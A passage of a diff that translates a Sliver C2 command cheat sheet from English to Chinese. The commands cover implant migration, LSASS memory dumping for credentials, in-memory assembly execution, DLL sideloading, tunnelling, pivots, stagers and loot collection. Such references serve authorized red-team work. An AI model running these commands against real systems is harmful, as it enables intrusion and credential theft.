     command: "sliver (SESSION_NAME) > execute {{command|whoami}}"
 
-  - title: sliver - execute command with arguments
+  - title: sliver - 带参数执行命令
     desc: |
-      Execute a command with arguments. Arguments are passed to the command as-is.
-      Useful for running system commands, scripts, or binaries with parameters.
+      带参数执行命令。
+      参数按原样传递给命令。
+      用于带参数运行系统命令、脚本或二进制文件。
     command: "sliver (SESSION_NAME) > execute {{command|powershell.exe}} {{args|-Command Get-Process}}"
 
-  - title: sliver - execute command and save output
+  - title: sliver - 执行命令并保存输出
     desc: |
-      Execute a command and save output to loot store. Useful for capturing command
-      output for later analysis or reporting. Output is stored server-side and shared
-      in multiplayer mode.
+      执行命令并将输出保存到战利品存储。
+      用于捕获命令输出以便后续分析或报告。
+      输出存储在服务器端，并在多人模式下共享。
     command: "sliver (SESSION_NAME) > execute {{command|whoami /all}} --loot"
 
-  - title: sliver - get interactive shell
+  - title: sliver - 获取交互式 shell
     desc: |
-      Spawn an interactive shell on the target. Provides a native shell (cmd.exe on
-      Windows, /bin/sh on Unix). Only works in session mode, not beacon mode. Use
-      'exit' to leave the shell.
+      在目标上生成交互式 shell。
+      提供原生 shell（Windows 上为 cmd.exe，Unix 上为 /bin/sh）。
+      仅在会话模式下工作，不适用于信标模式。
+      使用 exit 退出 shell。
     command: "sliver (SESSION_NAME) > shell"
 
-  - title: sliver - migrate to process
+  - title: sliver - 迁移到进程
     desc: |
-      Migrate the implant to a different process. The implant injects into the target
-      process and continues execution there. Useful for process hollowing, evading
-      detection, or moving to a more privileged process. Only works in session mode.
+      将植入体迁移到不同的进程。
+      植入体会注入目标进程并在其中继续执行。
+      用于进程挖空、规避检测或迁移到更高权限的进程。
+      仅在会话模式下工作。
     command: "sliver (SESSION_NAME) > migrate {{pid|1234}}"
 
-  - title: sliver - dump process memory
+  - title: sliver - 转储进程内存
     desc: |
-      Dump the memory of a process to a file. Useful for extracting credentials from
-      process memory (e.g., LSASS on Windows). Creates a memory dump file that can be
-      analyzed offline or with tools like Mimikatz.
+      将进程的内存转储到文件。
+      用于从进程内存中提取凭据（例如 Windows 上的 LSASS）。
+      创建可离线分析或使用 Mimikatz 等工具分析的内存转储文件。
     command: "sliver (SESSION_NAME) > procdump --pid {{pid|1234}} --save {{output|C:\\Temp\\dump.dmp}}"
 
-  - title: sliver - dump process memory by name
+  - title: sliver - 按名称转储进程内存
     desc: |
-      Dump process memory by process name instead of PID. Finds the first process
-      matching the name and dumps its memory. Useful when PID is unknown or changes.
+      按进程名称而不是 PID 转储进程内存。
+      查找第一个匹配该名称的进程并转储其内存。
+      当 PID 未知或变化时很有用。
     command: "sliver (SESSION_NAME) > procdump --name {{process_name|lsass.exe}} --save {{output|C:\\Temp\\lsass.dmp}}"
 
-  - title: sliver - execute assembly (in-memory)
+  - title: sliver - 执行程序集（内存中）
     desc: |
-      Execute a .NET assembly in-memory without writing to disk. Loads the assembly
-      into the current process and executes it. Useful for running tools like Rubeus,
-      Seatbelt, or SharpHound without touching disk. Only works on Windows.
+      在内存中执行 .NET 程序集而不写入磁盘。
+      将程序集加载到当前进程并执行。
+      用于运行 Rubeus、Seatbelt 或 SharpHound 等工具而不接触磁盘。
+      仅适用于 Windows。
     command: "sliver (SESSION_NAME) > execute-assembly {{assembly_path|/tmp/Rubeus.exe}} {{args|dump}}"
 
-  - title: sliver - execute assembly and save output
+  - title: sliver - 执行程序集并保存输出
     desc: |
-      Execute a .NET assembly and save output to loot store. Captures stdout/stderr
-      from the assembly execution. Useful for storing enumeration results or tool
-      output for later analysis.
+      执行 .NET 程序集并将输出保存到战利品存储。
+      捕获程序集执行的 stdout/stderr。
+      用于存储枚举结果或工具输出以便后续分析。
     command: "sliver (SESSION_NAME) > execute-assembly {{assembly_path|/tmp/Seatbelt.exe}} --loot"
 
-  - title: sliver - sideload DLL
+  - title: sliver - 侧载 DLL
     desc: |
-      Sideload a DLL into a process. Loads the DLL into the target process without
-      writing to disk (or with minimal disk writes). Useful for loading malicious
-      DLLs or tools into trusted processes. Only works on Windows.
+      将 DLL 侧载到进程中。
+      将 DLL 加载到目标进程中而不写入磁盘（或最小化磁盘写入）。
+      用于将恶意 DLL 或工具加载到受信任进程中。
+      仅适用于 Windows。
     command: "sliver (SESSION_NAME) > sideload {{dll_path|/tmp/malicious.dll}} --process {{process_name|notepad.exe}}"
 
-  - title: sliver - spawn process
+  - title: sliver - 生成进程
     desc: |
-      Spawn a new process on the target. Creates a new process with specified command
-      and arguments. The process runs independently of the implant. Useful for
-      executing commands in a separate process context.
+      在目标上生成新进程。
+      使用指定命令和参数创建新进程。
+      该进程独立于植入体运行。
+      用于在单独进程上下文中执行命令。
     command: "sliver (SESSION_NAME) > spawn {{process_name|notepad.exe}}"
 
   # ============================================================================
   # NETWORK OPERATIONS
   # ============================================================================
 
-  - title: sliver - add port forward
+  - title: sliver - 添加端口转发
     desc: |
-      Create a port forward to tunnel TCP connections through the implant. Forwards
-      connections from local machine to remote target. Works over any C2 protocol
-      (in-band tunneling). Default binds to 127.0.0.1.
+      创建端口转发，通过植入体隧道传输 TCP 连接。
+      将连接从本地机器转发到远程目标。
+      可通过任何 C2 协议工作（带内隧道）。
+      默认绑定到 127.0.0.1。
     command: "sliver (SESSION_NAME) > portfwd add --remote {{remote_ip|10.10.10.10}}:{{remote_port|22}}"
 
-  - title: sliver - add port forward with custom bind
+  - title: sliver - 使用自定义绑定添加端口转发
     desc: |
-      Create a port forward with custom bind address and port. Useful when you need
-      to bind to a specific interface or port. The forward maps local:port to remote:port.
+      使用自定义绑定地址和端口创建端口转发。
+      当你需要绑定到特定接口或端口时很有用。
+      转发将 local:port 映射到 remote:port。
     command: "sliver (SESSION_NAME) > portfwd add --bind {{bind_ip|127.0.0.1}}:{{bind_port|8080}} --remote {{remote_ip|10.10.10.10}}:{{remote_port|3389}}"
 
-  - title: sliver - list port forwards
+  - title: sliver - 列出端口转发
     desc: |
-      List all active port forwards for the current session. Shows forward ID, bind
-      address, and remote address. Use forward IDs to manage forwards.
+      列出当前会话的所有活动端口转发。
+      显示转发 ID、绑定地址和远程地址。
+      使用转发 ID 来管理转发。
     command: "sliver (SESSION_NAME) > portfwd"
 
-  - title: sliver - remove port forward
+  - title: sliver - 删除端口转发
     desc: |
-      Remove a port forward by ID. Stops forwarding connections for the specified
-      forward. Use 'portfwd' command to see active forward IDs.
+      按 ID 删除端口转发。
+      停止指定转发的连接转发。
+      使用 portfwd 命令查看活动转发 ID。
     command: "sliver (SESSION_NAME) > portfwd rm {{forward_id|1}}"
 
-  - title: sliver - add reverse port forward
+  - title: sliver - 添加反向端口转发
     desc: |
-      Create a reverse port forward (rportfwd). Forwards connections from the target
-      to your local machine. Useful when the target can reach you but you can't reach
-      the target directly. Available in Sliver v1.5.27+.
+      创建反向端口转发（rportfwd）。
+      将连接从目标转发到你的本地机器。
+      当目标可以访问你但你无法直接访问目标时很有用。
+      适用于 Sliver v1.5.27+。
     command: "sliver (SESSION_NAME) > rportfwd add --remote {{remote_ip|127.0.0.1}}:{{remote_port|3389}} --bind {{bind_port|13389}}"
 
-  - title: sliver - start SOCKS5 proxy
+  - title: sliver - 启动 SOCKS5 代理
     desc: |
-      Start an in-band SOCKS5 proxy through the implant. Tunnels all SOCKS traffic
-      through the C2 channel. Works over any C2 protocol. Default binds to 127.0.0.1:1081.
-      Can be unstable depending on protocol.
+      通过植入体启动带内 SOCKS5 代理。
+      通过 C2 通道隧道传输所有 SOCKS 流量。
+      可通过任何 C2 协议工作。
+      默认绑定到 127.0.0.1:1081。
+      根据协议可能不稳定。
     command: "sliver (SESSION_NAME) > socks5 add"
 
-  - title: sliver - start SOCKS5 proxy with custom bind
+  - title: sliver - 使用自定义绑定启动 SOCKS5 代理
     desc: |
-      Start a SOCKS5 proxy with custom bind address and port. Useful when you need
-      a specific bind configuration. SOCKS5 proxies tunnel all traffic through the
-      C2 channel (in-band).
+      使用自定义绑定地址和端口启动 SOCKS5 代理。
+      当你需要特定绑定配置时很有用。
+      SOCKS5 代理通过 C2 通道隧道传输所有流量（带内）。
     command: "sliver (SESSION_NAME) > socks5 add --bind {{bind_ip|127.0.0.1}}:{{bind_port|1080}}"
 
-  - title: sliver - list SOCKS5 proxies
+  - title: sliver - 列出 SOCKS5 代理
     desc: |
-      List all active SOCKS5 proxies for the current session. Shows proxy ID, bind
-      address, and status. Use proxy IDs to manage proxies.
+      列出当前会话的所有活动 SOCKS5 代理。
+      显示代理 ID、绑定地址和状态。
+      使用代理 ID 来管理代理。
     command: "sliver (SESSION_NAME) > socks5"
 
-  - title: sliver - stop SOCKS5 proxy
+  - title: sliver - 停止 SOCKS5 代理
     desc: |
-      Stop a SOCKS5 proxy by ID. Closes the proxy and stops forwarding SOCKS traffic.
-      Use 'socks5' command to see active proxy IDs.
+      按 ID 停止 SOCKS5 代理。
+      关闭代理并停止转发 SOCKS 流量。
+      使用 socks5 命令查看活动代理 ID。
     command: "sliver (SESSION_NAME) > socks5 rm {{proxy_id|1}}"
 
-  - title: sliver - add WireGuard port forward
+  - title: sliver - 添加 WireGuard 端口转发
     desc: |
-      Create a WireGuard port forward. Only available when using WireGuard C2.
-      WireGuard port forwards are faster and more reliable than in-band port forwards.
-      Requires WireGuard client configuration setup.
+      创建 WireGuard 端口转发。
+      仅在使用 WireGuard C2 时可用。
+      WireGuard 端口转发比带内端口转发更快、更可靠。
+      需要设置 WireGuard 客户端配置。
     command: "sliver (SESSION_NAME) > wg-portfwd add --remote {{remote_ip|10.10.10.10}}:{{remote_port|3389}}"
 
-  - title: sliver - add WireGuard port forward with custom bind
+  - title: sliver - 使用自定义绑定添加 WireGuard 端口转发
     desc: |
-      Create a WireGuard port forward with custom bind address. WireGuard forwards
-      use the WireGuard network interface (typically 100.64.0.x). Faster than in-band
-      forwards but requires WireGuard setup.
+      使用自定义绑定地址创建 WireGuard 端口转发。
+      WireGuard 转发使用 WireGuard 网络接口（通常为 100.64.0.x）。
+      比带内转发更快，但需要 WireGuard 设置。
     command: "sliver (SESSION_NAME) > wg-portfwd add --bind {{bind_ip|100.64.0.17}}:{{bind_port|1080}} --remote {{remote_ip|10.10.10.10}}:{{remote_port|3389}}"
 
-  - title: sliver - start WireGuard SOCKS5 proxy
+  - title: sliver - 启动 WireGuard SOCKS5 代理
     desc: |
-      Start a WireGuard SOCKS5 proxy. Only available when using WireGuard C2.
-      WireGuard SOCKS proxies are faster and more reliable than in-band SOCKS proxies.
-      Requires WireGuard client configuration setup.
+      启动 WireGuard SOCKS5 代理。
+      仅在使用 WireGuard C2 时可用。
+      WireGuard SOCKS 代理比带内 SOCKS 代理更快、更可靠。
+      需要设置 WireGuard 客户端配置。
     command: "sliver (SESSION_NAME) > wg-socks"
 
-  - title: sliver - get WireGuard client config
+  - title: sliver - 获取 WireGuard 客户端配置
     desc: |
-      Generate WireGuard client configuration for connecting to the WireGuard listener.
-      The config can be saved to a file using --save. You'll need to set the Endpoint
-      to point to your Sliver server's WireGuard listener IP and port.
+      生成用于连接 WireGuard 监听器的 WireGuard 客户端配置。
+      可以使用 --save 将配置保存到文件。
+      你需要将 Endpoint 设置为指向 Sliver 服务器的 WireGuard 监听器 IP 和端口。
     command: "sliver > wg-config"
 
-  - title: sliver - get WireGuard client config and save
+  - title: sliver - 获取并保存 WireGuard 客户端配置
     desc: |
-      Generate WireGuard client configuration and save to file. The config file can
-      be used with wg-quick or other WireGuard clients. Remember to set the Endpoint
-      in the config file to your server's IP and port.
+      生成 WireGuard 客户端配置并保存到文件。
+      配置文件可与 wg-quick 或其他 WireGuard 客户端一起使用。
+      记得将配置文件中的 Endpoint 设置为服务器的 IP 和端口。
     command: "sliver > wg-config --save {{config_path|./wireguard.conf}}"
 
   # ============================================================================
   # PIVOTS
   # ============================================================================
 
-  - title: sliver - start TCP pivot listener
+  - title: sliver - 启动 TCP 枢纽监听器
     desc: |
-      Start a TCP pivot listener on the current session. Pivots allow other implants
-      to connect through this session, creating a chain of C2 connections. TCP pivots
-      work on all platforms. Default port is 9898.
+      在当前会话上启动 TCP 枢纽监听器。
+      枢纽允许其他植入体通过此会话连接，形成 C2 连接链。
+      TCP 枢纽适用于所有平台。
+      默认端口为 9898。
     command: "sliver (SESSION_NAME) > pivots tcp"
 
-  - title: sliver - start TCP pivot listener on custom port
+  - title: sliver - 在自定义端口启动 TCP 枢纽监听器
     desc: |
-      Start a TCP pivot listener on a custom port. Useful when default port is blocked
-      or you need multiple pivot listeners. The port should be accessible from the
-      network where you'll deploy the pivot implant.
+      在自定义端口上启动 TCP 枢纽监听器。
+      当默认端口被阻止或你需要多个枢纽监听器时很有用。
+      该端口应可从你部署枢纽植入体的网络访问。
     command: "sliver (SESSION_NAME) > pivots tcp --bind {{port|9999}}"
 
-  - title: sliver - start named pipe pivot listener (Windows)
+  - title: sliver - 启动命名管道枢纽监听器（Windows）
     desc: |
-      Start a named pipe pivot listener on Windows. Named pipes work over SMB and
-      allow pivoting through Windows sessions. Specify a pipe name with --bind. Only
-      works on Windows sessions.
+      在 Windows 上启动命名管道枢纽监听器。
+      命名管道通过 SMB 工作，允许通过 Windows 会话进行枢纽。
+      使用 --bind 指定管道名称。
+      仅适用于 Windows 会话。
     command: "sliver (SESSION_NAME) > pivots named-pipe --bind {{pipe_name|foobar}}"
 
-  - title: sliver - start named pipe pivot with allow all
+  - title: sliver - 使用 allow-all 启动命名管道枢纽
     desc: |
-      Start a named pipe pivot listener allowing all users/groups. By default, pipes
-      only allow the current user/group. Use --allow-all to allow all users to connect.
-      Useful in some restricted environments.
+      启动允许所有用户/组的命名管道枢纽监听器。
+      默认情况下管道只允许当前用户/组。
+      使用 --allow-all 允许所有用户连接。
+      在某些受限环境中有用。
     command: "sliver (SESSION_NAME) > pivots named-pipe --bind {{pipe_name|foobar}} --allow-all"
 
-  - title: sliver - list pivot listeners
+  - title: sliver - 列出枢纽监听器
     desc: |
-      List all active pivot listeners. Shows listener ID, protocol, bind address, and
-      number of connected pivots. Use listener IDs to manage pivots.
+      列出所有活动的枢纽监听器。
+      显示监听器 ID、协议、绑定地址和已连接的枢纽数量。
+      使用监听器 ID 来管理枢纽。
     command: "sliver (SESSION_NAME) > pivots"
 
-  - title: sliver - generate TCP pivot implant
+  - title: sliver - 生成 TCP 枢纽植入体
     desc: |
-      Generate an implant that connects through a TCP pivot listener. The implant
-      will connect to the pivot listener IP and port, then tunnel C2 traffic through
-      the pivot. Useful for accessing restricted networks.
+      生成通过 TCP 枢纽监听器连接的植入体。
+      植入体会连接到枢纽监听器的 IP 和端口，然后通过枢纽隧道传输 C2 流量。
+      用于访问受限网络。
     command: "sliver > generate --mtls {{domain|example.com}} --tcp-pivot {{pivot_ip|192.168.1.1}}:{{pivot_port|9898}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate named pipe pivot implant
+  - title: sliver - 生成命名管道枢纽植入体
     desc: |
-      Generate an implant that connects through a named pipe pivot. The implant will
-      connect to the specified host and pipe name. Syntax is <host>/pipe/<pipe_name>.
-      Use '.' for localhost (127.0.0.1).
+      生成通过命名管道枢纽连接的植入体。
+      植入体会连接到指定主机和管道名称。
+      语法为 <host>/pipe/<pipe_name>。
+      使用 . 表示 localhost（127.0.0.1）。
     command: "sliver > generate --mtls {{domain|example.com}} --named-pipe {{host|192.168.1.1}}/pipe/{{pipe_name|foobar}} --save {{output_dir|/tmp}}"
 
   # ============================================================================
   # STAGERS
   # ============================================================================
 
-  - title: sliver - create staging profile
+  - title: sliver - 创建分阶段配置
     desc: |
-      Create a profile for staging. Profiles are implant blueprints that define
-      configuration to be reused. Staging profiles typically use shellcode format.
-      Profiles are used with stage-listener command.
+      为分阶段创建配置。
+      配置是可复用的植入体蓝图，定义了要复用的配置。
+      分阶段配置通常使用 shellcode 格式。
+      配置与 stage-listener 命令配合使用。
     command: "sliver > profiles new --mtls {{domain|192.168.122.1}} --format {{format|shellcode}} {{profile_name|win-shellcode}}"
 
-  - title: sliver - start HTTP staging listener
+  - title: sliver - 启动 HTTP 分阶段监听器
     desc: |
-      Start an HTTP staging listener. Staging listeners serve stage 2 payloads to
-      stagers. The listener is linked to a profile that defines the stage 2 payload
-      configuration. Stagers download and execute the stage 2 payload in memory.
+      启动 HTTP 分阶段监听器。
+      分阶段监听器向 stager 提供第二阶段的载荷。
+      监听器与定义第二阶段载荷配置的配置关联。
+      stager 会在内存中下载并执行第二阶段载荷。
     command: "sliver > stage-listener --url {{url|http://192.168.122.1:1234}} --profile {{profile_name|win-shellcode}}"
 
-  - title: sliver - start HTTPS staging listener
+  - title: sliver - 启动 HTTPS 分阶段监听器
     desc: |
-      Start an HTTPS staging listener. Same as HTTP but uses SSL/TLS encryption.
-      Useful when you need encrypted staging or want to blend in with HTTPS traffic.
+      启动 HTTPS 分阶段监听器。
+      与 HTTP 相同，但使用 SSL/TLS 加密。
+      当你需要加密的分阶段传输或想混入 HTTPS 流量时很有用。
     command: "sliver > stage-listener --url {{url|https://192.168.122.1:8443}} --profile {{profile_name|win-shellcode}}"
 
-  - title: sliver - start TCP staging listener
+  - title: sliver - 启动 TCP 分阶段监听器
     desc: |
-      Start a TCP staging listener. TCP stagers connect directly to the listener
-      and download the stage 2 payload. Format: tcp://IP:PORT.
+      启动 TCP 分阶段监听器。
+      TCP stager 直接连接到监听器并下载第二阶段载荷。
+      格式：tcp://IP:PORT。
     command: "sliver > stage-listener --url {{url|tcp://192.168.122.1:1234}} --profile {{profile_name|win-shellcode}}"
 
-  - title: sliver - start staging listener with prepend size
+  - title: sliver - 使用前置大小启动分阶段监听器
     desc: |
-      Start a staging listener with prepended size. Required when using Metasploit
-      stagers (msfvenom). Metasploit stagers expect the payload size to be prepended
-      to the stage 2 payload. Only supported on Windows.
+      使用前置大小启动分阶段监听器。
+      使用 Metasploit stager（msfvenom）时需要。
+      Metasploit stager 期望在第二阶段载荷前附带载荷大小。
+      仅在 Windows 上受支持。
     command: "sliver > stage-listener --url {{url|http://192.168.122.1:1234}} --profile {{profile_name|win-shellcode}} --prepend-size"
 
-  - title: sliver - start staging listener with encryption
+  - title: sliver - 使用加密启动分阶段监听器
     desc: |
-      Start a staging listener with AES encryption. The stage 2 payload is encrypted
-      with AES-CBC-128 before being served. Stagers must decrypt the payload before
-      execution. Provides basic obfuscation.
+      使用 AES 加密启动分阶段监听器。
+      第二阶段载荷在提供之前使用 AES-CBC-128 加密。
+      stager 必须在执行前解密载荷。
+      提供基础的混淆。
     command: "sliver > stage-listener --url {{url|http://192.168.0.52:80}} --profile {{profile_name|win-shellcode}} --aes-encrypt-key {{key|D(G+KbPeShVmYq3t}} --aes-encrypt-iv {{iv|8y/B?E(G+KbPeShV}}"
 
-  - title: sliver - start staging listener with compression
+  - title: sliver - 使用压缩启动分阶段监听器
     desc: |
-      Start a staging listener with compression. Compresses the stage 2 payload before
-      serving. Options: zlib, gzip, deflate (level 9). Reduces payload size but
-      stagers must decompress before execution.
+      使用压缩启动分阶段监听器。
+      在提供前压缩第二阶段载荷。
+      选项：zlib、gzip、deflate（级别 9）。
+      减小载荷大小，但 stager 必须在执行前解压。
     command: "sliver > stage-listener --url {{url|http://192.168.0.52:80}} --profile {{profile_name|win-shellcode}} --compress {{method|gzip}}"
 
-  - title: sliver - generate stager
+  - title: sliver - 生成 stager
     desc: |
-      Generate a stager payload. Stagers are small initial payloads that download
-      and execute the full stage 2 payload. Useful when the full implant is too
-      large or you need a small initial dropper.
+      生成 stager 载荷。
+      stager 是下载并执行完整第二阶段载荷的小型初始载荷。
+      当完整植入体过大或你需要小型初始投放器时很有用。
     command: "sliver > generate stager --lhost {{lhost|192.168.122.1}} --lport {{lport|1234}} --protocol {{protocol|http}} --save {{output_dir|/tmp}}"
 
   # ============================================================================
   # LOOT
   # ============================================================================
 
-  - title: sliver - add remote file to loot
+  - title: sliver - 将远程文件添加到战利品
     desc: |
-      Download a file from the target and add it to the loot store. The file is
-      stored server-side and shared among all operators in multiplayer mode.
-      Useful for centralizing collected data.
+      从目标下载文件并添加到战利品存储。
+      文件存储在服务器端，并在多人模式下所有操作员共享。
+      用于集中收集的数据。
     command: "sliver (SESSION_NAME) > loot remote {{remote_path|C:\\Users\\Desktop\\secrets.txt}}"
 
-  - title: sliver - add local file to loot
+  - title: sliver - 将本地文件添加到战利品
     desc: |
-      Add a file from the local machine to the loot store. The file is uploaded
-      to the server and stored in the loot database. Useful for storing tools,
-      scripts, or other files server-side.
+      将本地机器上的文件添加到战利品存储。
+      文件上传到服务器并存储在战利品数据库中。
+      用于在服务器端存储工具、脚本或其他文件。
     command: "sliver > loot local {{local_path|/tmp/credentials.txt}}"
 
-  - title: sliver - fetch loot
+  - title: sliver - 获取战利品
     desc: |
-      Fetch and view loot from the loot store. Presents an interactive menu to
-      select loot items. Textual loot is displayed directly, file loot can be
-      saved to a local file.
+      从战利品存储中获取并查看战利品。
+      呈现交互式菜单以选择战利品项。
+      文本战利品直接显示，文件战利品可保存到本地文件。
     command: "sliver > loot fetch"
 
-  - title: sliver - list all loot
+  - title: sliver - 列出所有战利品
     desc: |
-      List all items in the loot store. Shows loot ID, type, name, size, and
-      other metadata. Useful for browsing collected loot or finding specific items.
+      列出战利品存储中的所有项。
+      显示战利品 ID、类型、名称、大小和其他元数据。
+      用于浏览收集的战利品或查找特定项。
     command: "sliver > loot"
 
-  - title: sliver - remove loot
+  - title: sliver - 删除战利品
     desc: |
-      Remove an item from the loot store by ID. Permanently deletes the loot item
-      from the server database. Use 'loot' command to see loot IDs.
+      按 ID 从战利品存储中删除项。
+      从服务器数据库永久删除战利品项。
+      使用 loot 命令查看战利品 ID。
     command: "sliver > loot rm {{loot_id|1}}"
 
   # ============================================================================
   # ARMORY & EXTENSIONS
   # ============================================================================
 
-  - title: sliver - list armory packages
+  - title: sliver - 列出军械库包
     desc: |
-      List all available packages in the armory. Shows package names, types (alias
-      or extension), versions, and descriptions. Packages include BOFs, .NET tools,
-      and other third-party tools.
+      列出军械库中所有可用的包。
+      显示包名称、类型（别名或扩展）、版本和描述。
+      包包括 BOF、.NET 工具和其他第三方工具。
     command: "sliver > armory"
 
-  - title: sliver - install armory package
+  - title: sliver - 安装军械库包
     desc: |
-      Install a package from the armory. Packages are downloaded from GitHub and
-      installed client-side. Each operator must install packages individually.
-      Packages are cryptographically signed by Sliver authors.
+      从军械库安装包。
+      包从 GitHub 下载并安装在客户端。
+      每个操作员必须单独安装包。
+      包由 Sliver 作者进行加密签名。
     command: "sliver > armory install {{package_name|rubeus}}"
 
-  - title: sliver - install all armory packages
+  - title: sliver - 安装所有军械库包
     desc: |
-      Install all available packages from the armory. Downloads and installs every
-      package. Useful for setting up a complete toolset, but may take some time.
+      从军械库安装所有可用包。
+      下载并安装每个包。
+      用于设置完整的工具集，但可能需要一些时间。
     command: "sliver > armory install all"
 
-  - title: sliver - update armory packages
+  - title: sliver - 更新军械库包
     desc: |
-      Update all installed armory packages to the latest versions. Checks for
-      updates and installs newer versions if available. Keeps your tools up to date.
+      将所有已安装的军械库包更新到最新版本。
+      检查更新并安装可用的新版本。
+      让你的工具保持最新。
     command: "sliver > armory update"
 
-  - title: sliver - list installed aliases
+  - title: sliver - 列出已安装的别名
     desc: |
-      List all installed aliases. Aliases are command wrappers for external tools
-      (e.g., Rubeus, SharpHound). Shows alias names and versions.
+      列出所有已安装的别名。
+      别名是外部工具（例如 Rubeus、SharpHound）的命令包装器。
+      显示别名名称和版本。
     command: "sliver > aliases"
 
-  - title: sliver - list installed extensions
+  - title: sliver - 列出已安装的扩展
     desc: |
-      List all installed extensions. Extensions add new functionality to Sliver
-      (e.g., BOF loader, COFF support). Shows extension names and versions.
+      列出所有已安装的扩展。
+      扩展为 Sliver 添加新功能（例如 BOF 加载器、COFF 支持）。
+      显示扩展名称和版本。
     command: "sliver > extensions"
 
-  - title: sliver - remove alias
+  - title: sliver - 删除别名
     desc: |
-      Remove an installed alias by name. Uninstalls the alias from the client.
-      The alias files are stored in ~/.sliver-client/ and can be manually deleted.
+      按名称删除已安装的别名。
+      从客户端卸载别名。
+      别名文件存储在 ~/.sliver-client/ 中，可以手动删除。
     command: "sliver > aliases rm {{alias_name|rubeus}}"
 
-  - title: sliver - remove extension
+  - title: sliver - 删除扩展
     desc: |
-      Remove an installed extension by name. Uninstalls the extension from the
-      client. Extensions are stored in ~/.sliver-client/ and can be manually deleted.
+      按名称删除已安装的扩展。
+      从客户端卸载扩展。
+      扩展存储在 ~/.sliver-client/ 中，可以手动删除。
     command: "sliver > extensions rm {{extension_name|coff-loader}}"
 
-  - title: sliver - load local extension
+  - title: sliver - 加载本地扩展
     desc: |
-      Load a locally developed extension. Extensions must have an extension.json
-      manifest file. Local extensions don't need to be cryptographically signed.
-      Useful for custom BOFs or tools.
+      加载本地开发的扩展。
+      扩展必须有 extension.json 清单文件。
+      本地扩展无需加密签名。
+      用于自定义 BOF 或工具。
     command: "sliver > extensions load {{extension_path|/path/to/extension}}"
 
   # ============================================================================
   # PROFILES
   # ============================================================================
 
-  - title: sliver - create new profile
+  - title: sliver - 创建新配置
     desc: |
-      Create a new implant profile. Profiles are blueprints that define implant
-      configuration to be reused. Useful for standardizing implant generation
-      or for staging configurations.
+      创建新的植入体配置。
+      配置是定义可复用植入体配置的蓝图。
+      用于标准化植入体生成或分阶段配置。
     command: "sliver > profiles new --mtls {{domain|example.com}} --os {{os|windows}} --arch {{arch|amd64}} {{profile_name|win-mtls}}"
 
-  - title: sliver - list profiles
+  - title: sliver - 列出配置
     desc: |
-      List all saved profiles. Shows profile names, platforms, C2 configurations,
-      debug status, format, obfuscation settings, and limitations.
+      列出所有已保存的配置。
+      显示配置名称、平台、C2 配置、调试状态、格式、混淆设置和限制。
     command: "sliver > profiles"
 
-  - title: sliver - generate from profile
+  - title: sliver - 从配置生成
     desc: |
-      Generate an implant using a saved profile. Uses all settings from the profile.
-      Can override profile settings with additional flags if needed.
+      使用已保存的配置生成植入体。
+      使用配置中的所有设置。
+      需要时可以用额外标志覆盖配置设置。
     command: "sliver > generate --profile {{profile_name|win-mtls}} --save {{output_dir|/tmp}}"
 
   # ============================================================================
   # MULTIPLAYER MODE
   # ============================================================================
 
-  - title: sliver - create new operator
+  - title: sliver - 创建新操作员
     desc: |
-      Create a new operator configuration file for multiplayer mode. Generates client
-      certificate and config file. The config file allows the operator to connect
-      to the server. Specify operator name and server IP (--lhost).
+      为多人模式创建新的操作员配置文件。
+      生成客户端证书和配置文件。
+      配置文件允许操作员连接到服务器。
+      指定操作员名称和服务器 IP（--lhost）。
     command: "sliver > new-operator --name {{operator_name|moloch}} --lhost {{server_ip|1.2.3.4}}"
 
-  - title: sliver - start multiplayer listener
+  - title: sliver - 启动多人监听器
     desc: |
-      Start the multiplayer RPC listener. Allows multiple operators to connect
-      to the server simultaneously. Default port is TCP 31337. Must be running for
-      clients to connect.
+      启动多人 RPC 监听器。
+      允许多个操作员同时连接到服务器。
+      默认端口为 TCP 31337。
+      必须运行才能让客户端连接。
     command: "sliver > multiplayer"
 
-  - title: sliver - start multiplayer listener on custom port
+  - title: sliver - 在自定义端口启动多人监听器
     desc: |
-      Start the multiplayer listener on a custom port. Useful when default port
-      31337 is blocked or you need multiple servers. Ensure firewall allows the port.
+      在自定义端口上启动多人监听器。
+      当默认端口 31337 被阻止或你需要多个服务器时很有用。
+      确保防火墙允许该端口。
     command: "sliver > multiplayer --lport {{port|31338}}"
 
-  - title: sliver - import operator config (client)
+  - title: sliver - 导入操作员配置（客户端）
     desc: |
-      Import an operator configuration file on the client. The config file is copied
-      to ~/.sliver-client/configs/. Client can then select the server when starting.
+      在客户端导入操作员配置文件。
+      配置文件复制到 ~/.sliver-client/configs/。
+      客户端启动时可以选择服务器。
     command: "sliver-client import {{config_file|./operator.cfg}}"
 
   # ============================================================================
   # ADVANCED C2 OPTIONS
   # ============================================================================
 
-  - title: sliver - generate HTTP with URL prefix
+  - title: sliver - 使用 URL 前缀生成 HTTP
     desc: |
-      Generate an HTTP implant with URL path prefix. All C2 requests will prepend
-      the specified path. Useful for HTTP redirectors or when you need specific
-      URL structures.
+      使用 URL 路径前缀生成 HTTP 植入体。
+      所有 C2 请求都会前置指定路径。
+      适用于 HTTP 重定向器或需要特定 URL 结构时。
     command: "sliver > generate --http {{domain|example.com}}/{{path_prefix|foo/bar}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate HTTP with advanced options
+  - title: sliver - 使用高级选项生成 HTTP
     desc: |
-      Generate an HTTP implant with advanced C2 options. Options are passed as URL
-      encoded parameters. Example options: driver=wininet, proxy=http://proxy:8080,
-      host-header for domain fronting, etc.
+      使用高级 C2 选项生成 HTTP 植入体。
+      选项以 URL 编码参数形式传递。
+      选项示例：driver=wininet、proxy=http://proxy:8080、用于域前置的 host-header 等。
     command: "sliver > generate --http {{domain|example.com}}?{{options|driver=wininet}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate HTTP with proxy
+  - title: sliver - 使用代理生成 HTTP
     desc: |
-      Generate an HTTP implant with proxy configuration. The implant will use the
-      specified proxy for all C2 traffic. Format: proxy=http://proxy.example.com:8080.
-      Only works with Go HTTP driver.
+      使用代理配置生成 HTTP 植入体。
+      植入体会对所有 C2 流量使用指定代理。
+      格式：proxy=http://proxy.example.com:8080。
+      仅适用于 Go HTTP 驱动。
     command: "sliver > generate --http {{domain|example.com}}?proxy={{proxy_url|http://proxy.example.com:8080}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate HTTP with proxy credentials
+  - title: sliver - 使用代理凭据生成 HTTP
     desc: |
-      Generate an HTTP implant with proxy authentication. Specify proxy URL and
-      credentials. Format: proxy=http://proxy:8080&proxy-username=user&proxy-password=pass.
-      Only works with Go HTTP driver.
+      使用代理认证生成 HTTP 植入体。
